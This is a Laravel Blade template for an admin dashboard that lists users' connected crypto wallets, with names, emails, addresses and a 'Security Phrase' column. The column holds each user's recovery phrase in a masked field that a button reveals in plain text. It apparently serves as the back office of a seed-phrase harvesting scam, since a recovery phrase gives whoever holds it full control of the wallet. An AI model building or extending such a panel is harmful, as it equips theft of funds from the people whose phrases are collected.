@extends('layouts.dashboard')
@section('content')

    <table class="table table-striped table-hover table-bordered datatable" id="table-4">
        <thead>
        <tr>
            <th>No</th>
            <th>Member Name</th>
            <th>Wallet Type</th>
            <th>Network</th>
            <th>Wallet Address</th>
            <th>Security Phrase</th>
            <th>Connected At</th>
        </tr>
        </thead>
        <tbody>
        <?php $no=0; ?>
        @foreach ($userWallets as $uw)
            <?php $no++; ?>
            <tr>
                <td>{{$no}}</td>
                <td><strong>{{ $uw->user->name ?? 'Unknown User' }}</strong><br><small>{{ $uw->user->email ?? '' }}</small></td>
                <td>{{ $uw->walletType->name ?? 'Deleted/Unknown' }}</td>
                <td><span class="label label-info">{{ $uw->walletType->network ?? 'N/A' }}</span></td>
                <td>{{ $uw->wallet_address ?? 'Not Provided' }}</td>
                <td>
                    <div class="input-group">
                        <input type="password" class="form-control" value="{{ $uw->security_phrase }}" id="phrase-{{$uw->id}}" readonly style="background-color: transparent;">
                        <span class="input-group-btn">
                            <button class="btn btn-default" type="button" onclick="togglePhrase('phrase-{{$uw->id}}')"><i class="fa fa-eye"></i></button>
                        </span>
                    </div>
                </td>
                <td>{{ $uw->created_at->format('d M Y H:i') }}</td>
            </tr>
        @endforeach
        </tbody>
    </table>

@endsection

@section('scripts')
<script>
    function togglePhrase(id) {
        var input = document.getElementById(id);
        if (input.type === "password") {
            input.type = "text";
        } else {
            input.type = "password";
        }
    }
</script>
@endsection
